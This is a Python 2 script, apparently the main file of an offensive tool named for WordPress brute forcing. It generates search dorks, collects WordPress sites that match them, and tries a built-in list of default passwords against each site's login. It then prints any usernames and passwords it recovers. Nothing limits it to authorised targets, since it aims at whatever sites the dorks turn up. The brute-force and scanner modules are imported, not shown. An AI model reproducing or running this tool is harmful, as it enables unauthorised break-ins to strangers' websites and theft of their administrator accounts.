#!/usr/bin/env python2
# -*- coding: utf-8 -*-
#
#

"""
Wordpress brute force tool with dork maker and dork scanner.
"""

__author__ = "Black Viking"
__date__   = "16.04.2017"

import os
import sys
import time

sys.path.append("./source")

import dorkMaker
import dorkScanner
import bruteForce

dorks        = []
sites        = []
default_pwds = ["admin", "demo", "demo123", "password", "password123", "qwerty", "qwerty123",
				"administrator", "root", "pass", "pass123", "123456789"]

def logo():
	logo = """
 __      ______________________                __          
/  \    /  \______   \______   \_______ __ ___/  |_  ____  
\   \/\/   /|     ___/|    |  _/\_  __ \  |  \   __\/ __ \ 
 \        / |    |    |    |   \ |  | \/  |  /|  | \  ___/ 
  \__/\  /  |____|    |______  / |__|  |____/ |__|  \___  >
       \/                    \/                         \/ 

\t\t\t\tVersion 1.0.0
\t\t\t\tCoded by Black Viking
\t\t\t\thttp://github.com/blackvkng"""
	print logo

def help():
	help = """
    Commands:
        generate dork 15    : Generate 15 dork, with random words.
        scan dorks 5        : Find 5 site for a dork (5 dork and 5 site ==> ~25 site)
        show passwords      : Show default passwords.
        show dorks          : Show generated dorks.
        show sites          : Show found sites from dorks.
        start               : Start to brute!
"""	
	print help

def main():
	global dorks, sites

	while True:
		wpb = raw_input("\nwpb => ").lower()

		if wpb == "help":
			help()

		elif wpb == "show passwords":
			print "-"*60
			for pwd in default_pwds:
				print "  "+pwd
			print "-"*60
			print "[*] There are %s password!"%(len(default_pwds))

		elif "generate dork" in wpb:
			num   = wpb.split()[-1]
			dorks = dorkMaker.generateDork(num)
			print "[*] Generated %s dork!"%(len(dorks))

		elif wpb == "show dorks":
			if len(dorks) != 0:
				print "-"*60
				for dork in dorks:
					print "  "+dork
				print "-"*60
				print "[*] There are %s dork!"%(len(dorks))
			
			else:
				print "[-] No dorks to show!"


		elif "scan dorks" in wpb:
			num = wpb.split()[-1]
			if len(dorks) != 0:
				print "\n[*] Scan started!"
				for dork in dorks:
					dorkScanner.getSites(dork, num)

				sites = dorkScanner.sites
				print "\n[+] Found %s site!"%(len(sites))

		elif wpb == "show sites":
			if len(sites) != 0:
				print "-"*60
				for site in sites:
					print "  "+site
				print "-"*60
				print "[*] There are %s site!"%(len(sites))

			else:
				print "[-] No sites to show!"

		elif wpb == "start":
			if len(sites) != 0:
				for site in sites:
					print "[-] Trying: ", site
					for pwd in default_pwds:
						bruteForce.brute(site, pwd)

				found = bruteForce.found
				if len(found) != 0:
					for f in found:
						print "-"*60
						print "[+] Site: %s"%(f[0])
						print "    [+] Username: %s"%(f[1])
						print "    [+] Password: %s"%(f[2])
				else:
					print "[-_-] I could not find anything."

			else:
				print "[-] No sites to brute!"

if __name__ == "__main__":
	logo()
	main()
